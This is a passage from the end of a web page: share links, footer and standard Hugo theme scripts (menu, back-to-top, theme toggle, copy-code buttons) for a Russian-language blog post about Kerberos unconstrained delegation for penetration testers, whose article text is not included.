0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Kerberos для специалиста по тестированию на проникновение. Часть 3. Неограниченное делегирование on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fardent101.github.io%2fposts%2fkerberos_delegation%2f&title=Kerberos%20%d0%b4%d0%bb%d1%8f%20%d1%81%d0%bf%d0%b5%d1%86%d0%b8%d0%b0%d0%bb%d0%b8%d1%81%d1%82%d0%b0%20%d0%bf%d0%be%20%d1%82%d0%b5%d1%81%d1%82%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d1%8e%20%d0%bd%d0%b0%20%d0%bf%d1%80%d0%be%d0%bd%d0%b8%d0%ba%d0%bd%d0%be%d0%b2%d0%b5%d0%bd%d0%b8%d0%b5.%20%d0%a7%d0%b0%d1%81%d1%82%d1%8c%203.%20%d0%9d%d0%b5%d0%be%d0%b3%d1%80%d0%b0%d0%bd%d0%b8%d1%87%d0%b5%d0%bd%d0%bd%d0%be%d0%b5%20%d0%b4%d0%b5%d0%bb%d0%b5%d0%b3%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d0%b5&summary=Kerberos%20%d0%b4%d0%bb%d1%8f%20%d1%81%d0%bf%d0%b5%d1%86%d0%b8%d0%b0%d0%bb%d0%b8%d1%81%d1%82%d0%b0%20%d0%bf%d0%be%20%d1%82%d0%b5%d1%81%d1%82%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d1%8e%20%d0%bd%d0%b0%20%d0%bf%d1%80%d0%be%d0%bd%d0%b8%d0%ba%d0%bd%d0%be%d0%b2%d0%b5%d0%bd%d0%b8%d0%b5.%20%d0%a7%d0%b0%d1%81%d1%82%d1%8c%203.%20%d0%9d%d0%b5%d0%be%d0%b3%d1%80%d0%b0%d0%bd%d0%b8%d1%87%d0%b5%d0%bd%d0%bd%d0%be%d0%b5%20%d0%b4%d0%b5%d0%bb%d0%b5%d0%b3%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d0%b5&source=https%3a%2f%2fardent101.github.io%2fposts%2fkerberos_delegation%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Kerberos для специалиста по тестированию на проникновение. Часть 3. Неограниченное делегирование on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fardent101.github.io%2fposts%2fkerberos_delegation%2f&title=Kerberos%20%d0%b4%d0%bb%d1%8f%20%d1%81%d0%bf%d0%b5%d1%86%d0%b8%d0%b0%d0%bb%d0%b8%d1%81%d1%82%d0%b0%20%d0%bf%d0%be%20%d1%82%d0%b5%d1%81%d1%82%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d1%8e%20%d0%bd%d0%b0%20%d0%bf%d1%80%d0%be%d0%bd%d0%b8%d0%ba%d0%bd%d0%be%d0%b2%d0%b5%d0%bd%d0%b8%d0%b5.%20%d0%a7%d0%b0%d1%81%d1%82%d1%8c%203.%20%d0%9d%d0%b5%d0%be%d0%b3%d1%80%d0%b0%d0%bd%d0%b8%d1%87%d0%b5%d0%bd%d0%bd%d0%be%d0%b5%20%d0%b4%d0%b5%d0%bb%d0%b5%d0%b3%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d0%b5"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Kerberos для специалиста по тестированию на проникновение. Часть 3. Неограниченное делегирование on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fardent101.github.io%2fposts%2fkerberos_delegation%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Kerberos для специалиста по тестированию на проникновение. Часть 3. Неограниченное делегирование on whatsapp" href="https://api.whatsapp.com/send?text=Kerberos%20%d0%b4%d0%bb%d1%8f%20%d1%81%d0%bf%d0%b5%d1%86%d0%b8%d0%b0%d0%bb%d0%b8%d1%81%d1%82%d0%b0%20%d0%bf%d0%be%20%d1%82%d0%b5%d1%81%d1%82%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d1%8e%20%d0%bd%d0%b0%20%d0%bf%d1%80%d0%be%d0%bd%d0%b8%d0%ba%d0%bd%d0%be%d0%b2%d0%b5%d0%bd%d0%b8%d0%b5.%20%d0%a7%d0%b0%d1%81%d1%82%d1%8c%203.%20%d0%9d%d0%b5%d0%be%d0%b3%d1%80%d0%b0%d0%bd%d0%b8%d1%87%d0%b5%d0%bd%d0%bd%d0%be%d0%b5%20%d0%b4%d0%b5%d0%bb%d0%b5%d0%b3%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d0%b5%20-%20https%3a%2f%2fardent101.github.io%2fposts%2fkerberos_delegation%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Kerberos для специалиста по тестированию на проникновение. Часть 3. Неограниченное делегирование on telegram" href="https://telegram.me/share/url?text=Kerberos%20%d0%b4%d0%bb%d1%8f%20%d1%81%d0%bf%d0%b5%d1%86%d0%b8%d0%b0%d0%bb%d0%b8%d1%81%d1%82%d0%b0%20%d0%bf%d0%be%20%d1%82%d0%b5%d1%81%d1%82%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d1%8e%20%d0%bd%d0%b0%20%d0%bf%d1%80%d0%be%d0%bd%d0%b8%d0%ba%d0%bd%d0%be%d0%b2%d0%b5%d0%bd%d0%b8%d0%b5.%20%d0%a7%d0%b0%d1%81%d1%82%d1%8c%203.%20%d0%9d%d0%b5%d0%be%d0%b3%d1%80%d0%b0%d0%bd%d0%b8%d1%87%d0%b5%d0%bd%d0%bd%d0%be%d0%b5%20%d0%b4%d0%b5%d0%bb%d0%b5%d0%b3%d0%b8%d1%80%d0%be%d0%b2%d0%b0%d0%bd%d0%b8%d0%b5&url=https%3a%2f%2fardent101.github.io%2fposts%2fkerberos_delegation%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://ardent101.github.io/>Ardent101</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="копировать";function s(){e.innerText="скопировано!",setTimeout(()=>{e.innerText="копировать"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>